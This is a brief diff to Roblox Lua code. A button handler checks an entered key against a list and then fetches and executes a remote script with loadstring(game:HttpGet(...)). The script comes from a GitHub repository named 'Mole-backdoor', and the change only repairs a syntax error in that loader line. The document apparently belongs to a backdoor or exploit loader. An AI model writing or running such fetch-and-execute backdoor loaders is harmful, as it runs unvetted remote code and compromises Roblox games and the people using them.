@@ -53,7 +53,7 @@ btn.MouseButton1Click:Connect(function()
 	for _, v in ipairs(list) do
 		if input == v then
 			gui:Destroy()
-			loadstring(game:HttpGet("https://raw.githubusercontent.com/TheTombstoneBackdoorOwner/Mole-backdoor/refs/heads/main/Mole.lua"))()"))()
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/TheTombstoneBackdoorOwner/Mole-backdoor/refs/heads/main/Mole.lua"))()
 			return
 		end
 	end
